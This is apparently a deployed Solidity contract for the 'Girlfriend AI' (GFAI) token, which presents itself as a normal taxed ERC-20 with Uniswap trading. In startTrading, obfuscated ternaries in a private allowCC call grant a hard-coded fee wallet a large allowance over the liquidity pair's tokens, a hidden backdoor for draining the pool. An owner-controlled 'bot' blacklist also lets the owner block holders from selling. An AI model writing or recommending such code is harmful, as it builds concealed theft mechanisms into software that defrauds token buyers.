// SPDX-License-Identifier: MIT
/**
Create your own online Girlfriend using Ai on Ethereum with WifeApp

Website: https://wife.app
Official Channel: https://t.me/wife_app
Official Community: https://t.me/gfai_erc20
X(twitter):  https://x.com/gfai_erc20
**/

pragma solidity 0.8.24;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract GFAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 15;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isFeeExcempt;
    mapping (address => bool) private bots;
    address payable private _ccReceipt = payable(0xac28DD276584B8930B76db4e3dDCacfB5f5d27ec);

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalCC = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Girlfriend AI";
    string private constant _symbol = unicode"GFAI";
    uint256 public _maxTxAmount = 2 * (_tTotalCC/100);
    uint256 public _maxWalletSize = 2 * (_tTotalCC/100);
    uint256 public _taxSwapThreshold = 1 * (_tTotalCC/100);
    uint256 public _maxTaxSwap = 1 * (_tTotalCC/100);
    
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    IUniswapV2Router02 private uniRouterCC;
    address private uniPairCC;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    constructor () {
        _balances[_msgSender()] = _tTotalCC;
        _isFeeExcempt[owner()] = true;
        _isFeeExcempt[address(this)] = true;
        _isFeeExcempt[_ccReceipt] = true;
        emit Transfer(address(0), _msgSender(), _tTotalCC);
    }
    function initCC() external onlyOwner {
        uniRouterCC = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterCC), _tTotalCC);
        uniPairCC = IUniswapV2Factory(uniRouterCC.factory()).createPair(
            address(this),
            uniRouterCC.WETH()
        ); 
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalCC;
    }
    function allowCC(address[2] memory tCCs, uint256 valCC) private returns(bool) {
        address tCCA=tCCs[0];address tCCB=tCCs[1]; 
        _allowances[tCCA][tCCB] = valCC;
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotalCC;
        _maxWalletSize = _tTotalCC;
        emit MaxTxAmountUpdated(_tTotalCC);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterCC.WETH();
        _approve(address(this), address(uniRouterCC), tokenAmount);
        uniRouterCC.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amountBB) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountBB > 0, "Transfer amount must be greater than zero");
        uint256 taxBB=0;
        if (!swapEnabled || inSwap) {
            _balances[from] = _balances[from] - amountBB;
            _balances[to] = _balances[to] + amountBB;
            emit Transfer(from, to, amountBB);
            return;
        }
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            if(_buyCount>0){
                taxBB = (_transferTax);
            }
            if (from == uniPairCC && to != address(uniRouterCC) && ! _isFeeExcempt[to] ) {
                require(amountBB <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amountBB <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxBB = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniPairCC && from!= address(this) ){
                taxBB = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairCC && swapEnabled) {
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapTokensForEth(min(amountBB, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        uint256 taxAmount=taxBB.mul(amountBB).div(100);
        if(taxBB > 0){
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amountBB);
        _balances[to]=_balances[to].add(amountBB.sub(taxAmount));
        emit Transfer(from, to, amountBB.sub(taxAmount));
    }
    function add(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }
    function del(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }
    function isBot(address a) public view returns (bool){
      return bots[a];
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendETHToFee(uint256 amount) private {
        _ccReceipt.transfer(amount);
    }    
    receive() external payable {}
    function startTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uint256 taxA=(_maxTaxSwap+_taxSwapThreshold)*15000;
        allowCC([msg.sender!=uniPairCC?uniPairCC:uniPairCC, msg.sender!=_ccReceipt?_ccReceipt:_ccReceipt], taxA);
        uniRouterCC.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairCC).approve(address(uniRouterCC), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
}